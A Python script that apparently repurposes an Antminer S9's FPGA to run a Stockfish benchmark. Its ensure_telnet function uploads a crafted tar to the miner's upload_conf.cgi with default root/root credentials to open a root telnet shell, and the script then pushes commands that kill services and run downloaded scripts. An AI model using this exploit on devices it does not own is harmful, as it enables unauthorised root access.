import socket
import time
import sys
import os
import urllib.request

IP = '192.168.2.100'
HTTP_HOST = '192.168.2.1:8000'

def ensure_telnet():
    s = socket.socket()
    s.settimeout(1.0)
    try:
        s.connect((IP, 23))
        s.close()
        print("[+] Telnet port 23 is open and ready!", flush=True)
        return True
    except:
        pass

    print("[*] Opening root telnet via upload_conf.cgi exploit...", flush=True)
    with open(r'C:\Users\Kolby\.gemini\antigravity\scratch\sparc_zynq\exploit_backup.tar', 'rb') as f:
        tar_bytes = f.read()

    boundary = '---------------------------30971039824056275816281729007'
    body = bytearray()
    body += f'--{boundary}\r\n'.encode()
    body += b'Content-Disposition: form-data; name="ant_conf_file"; filename="exploit_backup.tar"\r\n'
    body += b'Content-Type: application/x-tar\r\n\r\n'
    body += tar_bytes
    body += f'\r\n--{boundary}--\r\n'.encode()

    mgr = urllib.request.HTTPPasswordMgrWithDefaultRealm()
    mgr.add_password('antMiner Configuration', f'http://{IP}/', 'root', 'root')
    mgr.add_password(None, f'http://{IP}/', 'root', 'root')
    opener = urllib.request.build_opener(urllib.request.HTTPDigestAuthHandler(mgr))

    req = urllib.request.Request(f'http://{IP}/cgi-bin/upload_conf.cgi', data=body)
    req.add_header('Content-Type', f'multipart/form-data; boundary={boundary}')

    for _try in range(3):
        try:
            opener.open(req, timeout=45)
            print("[+] Exploit uploaded successfully!", flush=True)
            break
        except Exception as e:
            print(f"[!] Exploit attempt {_try+1} response: {e}", flush=True)
            time.sleep(3)

    time.sleep(1.5)
    for attempt in range(15):
        try:
            s = socket.socket()
            s.settimeout(1.5)
            s.connect((IP, 23))
            s.close()
            print("[+] Telnet port 23 is now ACTIVE!", flush=True)
            return True
        except:
            time.sleep(1.0)
    print("[-] Failed to connect to telnet!", flush=True)
    return False

def run(force_reboot=False, skip_prog=False):
    print("=" * 68)
    print("  LAUNCHING STAGE 5 STOCKFISH SPEEDTEST ON PHYSICAL FPGA PL")
    print("  Arch: MicroBlaze-V RISC-V (RV32IM_Zba_Zbb_Zbs) + HW NNUE AXI Accel")
    print("=" * 68)

    if not ensure_telnet():
        print("[-] Cannot reach telnet, exiting!")
        return

    s = socket.socket()
    s.settimeout(15)
    s.connect((IP, 23))

    def drain_socket():
        s.settimeout(0.05)
        while True:
            try:
                chunk = s.recv(4096)
                if not chunk: break
            except:
                break
        s.settimeout(15)

    def reconnect():
        nonlocal s
        try: s.close()
        except: pass
        for _ in range(10):
            try:
                s = socket.socket()
                s.settimeout(15)
                s.connect((IP, 23))
                time.sleep(0.5)
                return
            except:
                time.sleep(1.0)

    def cmd(c, sleep_sec=0.2, timeout=25):
        nonlocal s
        for attempt in range(3):
            try:
                drain_socket()
                s.sendall((c + "\n").encode())
                time.sleep(sleep_sec)
                buf = ""
                start = time.time()
                while time.time() - start < timeout:
                    try:
                        chunk = s.recv(4096)
                        if not chunk: break
                        buf += chunk.decode('latin1', errors='ignore')
                        if buf.endswith("# ") or "(unknown) #" in buf:
                            break
                    except socket.timeout:
                        pass
                return buf
            except (ConnectionResetError, BrokenPipeError, socket.error):
                print("  [!] Connection dropped, reconnecting...", flush=True)
                reconnect()
        return ""

    if force_reboot:
        print("\n[*] Performing /sbin/init 6 on S9 to ensure clean devcfg state...", flush=True)
        try:
            s.sendall(b"/sbin/init 6\n")
            time.sleep(1.0)
            s.close()
        except:
            pass
        print("[*] Waiting 45s for S9 to reboot...", flush=True)
        time.sleep(45)
        if not ensure_telnet():
            print("[-] Telnet recovery failed after reboot!")
            return
        s = socket.socket()
        s.settimeout(15)
        s.connect((IP, 23))

    print("\n1. Configuring kernel failsafes & stopping miner...", flush=True)
    cmd("echo 1 > /proc/sys/kernel/panic")
    cmd("echo 1 > /proc/sys/kernel/panic_on_oops")
    cmd("echo '#!/bin/sh' > /sbin/monitorcg")
    cmd("echo 'while true; do sleep 3600; done' >> /sbin/monitorcg")
    cmd("killall -9 monitorcg bmminer single-board-test 2>/dev/null")
    cmd("/etc/init.d/bmminer.sh stop 2>/dev/null")
    cmd("rmmod fpga_mem_driver bitmain_axi 2>/dev/null")

    # Check if prog_done is already 1
    prog_done_out = cmd("cat /sys/devices/amba.0/f8007000.ps7-dev-cfg/prog_done")
    cur_prog_done = "0"
    for l in prog_done_out.splitlines():
        if l.strip() in ["0", "1"]:
            cur_prog_done = l.strip()

    if not skip_prog:
        print("\n2. Programming Stage 5 Bitstream (mb_stockfish.bit.bin)...", flush=True)
        cmd("rm -f /tmp/mb_stockfish.bit.bin /tmp/test_write_devcfg.pl")
        cmd(f"wget http://{HTTP_HOST}/mb_stockfish.bit.bin -O /tmp/mb_stockfish.bit.bin", sleep_sec=1.5, timeout=20)
        cmd(f"wget http://{HTTP_HOST}/test_write_devcfg.pl -O /tmp/test_write_devcfg.pl", sleep_sec=0.5, timeout=10)
        ls_bs = cmd("ls -lh /tmp/mb_stockfish.bit.bin")
        print("  Bitstream download:", ls_bs.strip(), flush=True)

        print("  Writing bitstream via perl syswrite...", flush=True)
        prog_res = cmd("perl /tmp/test_write_devcfg.pl", sleep_sec=2.0, timeout=20)
        print("  Programming result:", prog_res.strip(), flush=True)

        prog_done_out = cmd("cat /sys/devices/amba.0/f8007000.ps7-dev-cfg/prog_done")
        prog_done = "0"
        for l in prog_done_out.splitlines():
            if l.strip() in ["0", "1"]:
                prog_done = l.strip()
        print(f"  FPGA prog_done: {prog_done}", flush=True)
        if prog_done != "1":
            print("[-] Devcfg programming failed! Check devcfg status.", flush=True)
            s.close()
            return
    else:
        print("\n2. Skipping bitstream programming (already programmed in PL)...", flush=True)

    print("\n3. Enabling PL Clock (fclk0 @ 100MHz)...", flush=True)
    cmd("echo fclk0 > /sys/devices/amba.0/f8007000.ps7-dev-cfg/fclk_export 2>/dev/null")
    cmd("echo 100000000 > /sys/class/fclk/fclk0/set_rate 2>/dev/null")
    cmd("/sbin/devmem 0xf8000008 32 0xdf0d; /sbin/devmem 0xf8000170 32 0x00100a00; /sbin/devmem 0xf8000004 32 0x767b")
    cmd("echo 1 > /sys/class/fclk/fclk0/enable")
    fclk_status = cmd("cat /sys/class/fclk/fclk0/enable").strip()
    fclk_rate = cmd("cat /sys/class/fclk/fclk0/rate 2>/dev/null").strip()
    print(f"  fclk0 enable status: {fclk_status}, rate: {fclk_rate} Hz", flush=True)

    print("\n4. Enabling TrustZone DDR/DMA, PS-PL level shifters and AFI low-latency...", flush=True)
    cmd("/sbin/devmem 0xf8000008 32 0xdf0d")
    cmd("/sbin/devmem 0xf8000400 32 0xffffffff")
    cmd("/sbin/devmem 0xf8000404 32 0xffffffff")
    cmd("/sbin/devmem 0xf8000408 32 0xffffffff")
    cmd("/sbin/devmem 0xf8000430 32 0xffffffff")
    cmd("/sbin/devmem 0xf8000900 32 0x0000000f")
    cmd("/sbin/devmem 0xf8000004 32 0x767b")
    cmd("/sbin/devmem 0xf8008000 32 0x00000000")
    cmd("/sbin/devmem 0xf8008014 32 0x00000000")

    print("\n4.5 Asserting MicroBlaze reset via SLCR with level-shifter isolation...", flush=True)
    cmd("/sbin/devmem 0xf8000008 32 0xdf0d; /sbin/devmem 0xf8000900 32 0x0; /sbin/devmem 0xf8000240 32 0x1; /sbin/devmem 0xf8008000 32 0x0; /sbin/devmem 0xf8008014 32 0x0; /sbin/devmem 0xf8000004 32 0x767b")

    print("\n4.6 Clearing mailbox registers...", flush=True)
    for off in range(0, 64, 4):
        cmd(f"/sbin/devmem {0x1ff00000 + off:#x} 32 0x00000000")

    def get_devmem(addr):
        out = cmd(f"/sbin/devmem {addr:#x}", sleep_sec=0.04, timeout=3)
        lines = [l.strip() for l in out.splitlines() if l.strip().startswith("0x")]
        return lines[0] if lines else "0x00000000"

    print("\n5. Fetching DMA loader, telemetry reader & Stage 5 RISC-V Stockfish binary...", flush=True)
    cmd("rm -f /tmp/load_stockfish_riscv.pl /tmp/stockfish_riscv.bin /tmp/read_mb.pl")
    cmd(f"wget http://{HTTP_HOST}/load_stockfish_riscv.pl -O /tmp/load_stockfish_riscv.pl", sleep_sec=0.3, timeout=10)
    cmd(f"wget http://{HTTP_HOST}/read_mb.pl -O /tmp/read_mb.pl", sleep_sec=0.3, timeout=10)
    cmd(f"wget http://{HTTP_HOST}/stockfish_riscv.bin -O /tmp/stockfish_riscv.bin", sleep_sec=1.5, timeout=30)
    ls_out = cmd("ls -lh /tmp/stockfish_riscv.bin")
    print("  Binary on board:", ls_out.strip(), flush=True)

    print("\n6. Executing high-speed kernel DMA loader...", flush=True)
    dma_out = cmd("perl /tmp/load_stockfish_riscv.pl", sleep_sec=0.5, timeout=20)
    print("  DMA output:", dma_out.strip(), flush=True)

    print("\n7. Verifying RISC-V entry point [0x1F000000]:", flush=True)
    entry = [get_devmem(0x1f000000 + off) for off in [0, 4, 8, 12]]
    print(f"  Entry point words: {entry}", flush=True)

    print("\n8. Staging 'TART' (0x54415254) to 0x1FF00000 before reset release...", flush=True)
    cmd("/sbin/devmem 0x1ff00008 32 0x00000000")
    cmd("/sbin/devmem 0x1ff00000 32 0x54415254")

    print("\n8.1 Re-enabling level shifters and releasing MicroBlaze reset via SLCR...", flush=True)
    cmd("/sbin/devmem 0xf8000008 32 0xdf0d; /sbin/devmem 0xf8000900 32 0xf; /sbin/devmem 0xf8000240 32 0x0; /sbin/devmem 0xf8000004 32 0x767b")

    print("\n9. Monitoring real-time speedtest execution via mailbox...", flush=True)
    magic_names = {
        0xDEADBEEF: "HARDWARE TRAP / EXCEPTION",
        0xDEADBEE2: "NESTED TRAP / CSR ERROR",
        0x424F4F54: "BOOTLOADER BOOTING (CACHE INVALIDATE)",
        0x52445921: "BOOTLOADER READY",
        0x52554E21: "BOOTLOADER JUMPED TO STOCKFISH",
        0x43525430: "CRT0 INITIALIZING",
        0x43525431: "CRT0 BSS CLEARED",
        0x494E4954: "INITIALIZING ENGINE (main)",
        0x53504544: "SPEEDTEST SEARCHING POSITIONS",
        0x444F4E45: "BENCHMARK COMPLETED SUCCESSFULLY",
        0x52455421: "STOCKFISH RETURNED TO BOOTLOADER",
    }

    cmd("stty -echo")
    def read_mb():
        try:
            out = cmd("perl /tmp/read_mb.pl 2>/dev/null", sleep_sec=0.02, timeout=1.0)
            for l in out.splitlines():
                parts = l.strip().split()
                if len(parts) >= 8 and all(p.isdigit() for p in parts[:8]):
                    return [int(p) for p in parts[:8]]
        except Exception:
            pass
        # Fallback to devmem if read_mb.pl unavailable
        try:
            batch_cmd = "; ".join([f"/sbin/devmem {0x1ff00000 + i*4:#x}" for i in range(10)])
            out = cmd(batch_cmd, sleep_sec=0.03, timeout=1.5)
            hex_vals = []
            for l in out.splitlines():
                l = l.strip()
                if l.startswith("0x") and len(l) >= 8:
                    try:
                        hex_vals.append(int(l, 16))
                    except:
                        pass
            if len(hex_vals) >= 8:
                return hex_vals[:8]
        except Exception:
            pass
        return None

    last_magic = -1
    last_pos = -1
    last_print_time = 0
    bench_start_time = None
    start_mon = time.time()

    while time.time() - start_mon < 600:
        vals = read_mb()
        if not vals:
            time.sleep(0.3)
            continue

        magic = vals[0]
        pos = vals[1]
        total_pos = vals[2]
        nodes = vals[3] | (vals[4] << 32)
        elapsed_ms = vals[5]
        nps = vals[6]
        accel_word = vals[7]

        accel_tag = accel_word >> 16
        bucket = accel_word & 0xFF
        if accel_tag == 0xACC1:
            accel_str = f"HW (Bkt {bucket})"
        elif accel_tag == 0x50F7:
            accel_str = "SW Fallback"
        else:
            accel_str = f"0x{accel_word:08X}"

        magic_str = magic_names.get(magic, f"0x{magic:08X}")

        if magic != last_magic:
            if magic == 0x494E4954:
                probed_id = vals[2]
                print(f"  [MAILBOX STATE] Magic: 0x{magic:08X} ({magic_str}) | Probed Accel ID at 0x40000000: 0x{probed_id:08X}", flush=True)
            else:
                print(f"  [MAILBOX STATE] Magic: 0x{magic:08X} ({magic_str}) | Pos: {pos}/{total_pos} | Nodes: {nodes:,} | NPS: {nps} | Accel: {accel_str}", flush=True)
            last_magic = magic

        if magic in [0xDEADBEEF, 0xDEADBEE2] or (magic & 0xFFFF0000) == 0xDEAD0000:
            print(f"\n[!] HARDWARE TRAP DETECTED: 0x{magic:08X}", flush=True)
            print(f"    mcause: {hex(vals[1])} | mepc: {hex(vals[2])} | mtval: {hex(vals[3])} | ra: {hex(vals[4])}", flush=True)
            print(f"    word at mepc: {hex(vals[5])} | word at 0x1F000000: {hex(vals[6])} | sp: {hex(vals[7])}", flush=True)
            break

        if magic == 0x53504544 and bench_start_time is None:
            bench_start_time = time.time()
            print(f"\n[+] BENCHMARK COMMENCED AT {time.strftime('%H:%M:%S')}", flush=True)

        now_t = time.time()
        if pos != last_pos and magic == 0x53504544:
            host_elapsed = time.time() - bench_start_time if bench_start_time else 0
            print(f"[{host_elapsed:5.1f}s] Pos {pos:3d}/{total_pos} | Nodes: {nodes:8d} | NPS: {nps:6d} | Board ms: {elapsed_ms:6d} | Accel: {accel_str}", flush=True)
            last_pos = pos
        elif magic == 0x494E4954 and (now_t - last_print_time >= 3.0):
            last_print_time = now_t
            sub_state = hex(pos)
            print(f"  [MAILBOX STATE] Initializing (sub-state: {sub_state})", flush=True)

        if magic == 0x444F4E45 or (total_pos == 258 and pos == 258 and elapsed_ms > 150000):
            total_time = time.time() - bench_start_time if bench_start_time else (elapsed_ms / 1000.0)
            print("=" * 68, flush=True)
            print(f"  STAGE 5 SPEEDTEST COMPLETED SUCCESSFULLY!", flush=True)
            print(f"  Total Nodes:  {nodes:,}", flush=True)
            print(f"  Final NPS:    {nps:,} NPS", flush=True)
            print(f"  Total Time:   {total_time:.2f} s ({elapsed_ms:,} ms board time)", flush=True)
            print(f"  Accelerator:  {accel_str}", flush=True)
            print("=" * 68, flush=True)
            break

        time.sleep(0.3)

    cmd("stty echo")
    s.close()

if __name__ == '__main__':
    skip = '--skip-prog' in sys.argv
    reboot = '--reboot' in sys.argv
    run(force_reboot=reboot, skip_prog=skip)
